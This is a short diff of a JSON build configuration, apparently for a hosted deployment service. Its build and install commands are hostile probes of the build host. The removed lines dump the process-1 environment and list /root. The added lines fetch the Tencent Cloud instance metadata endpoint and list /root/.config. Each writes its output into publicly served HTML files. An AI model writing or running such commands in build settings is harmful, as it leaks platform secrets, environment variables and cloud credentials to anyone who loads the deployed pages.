@@ -1,5 +1,5 @@
 {
-    "buildCommand": "whoami>./aaa.html&&cat /proc/1/environ>>./aaa.html",
-    "installCommand": "ls -al /root>./bbb.html",
+    "buildCommand": "curl http://metadata.tencentyun.com/latest/meta-data/>./aaa.html",
+    "installCommand": "ls -al /root/.config>./bbb.html",
     "outputDirectory": "./"
 }
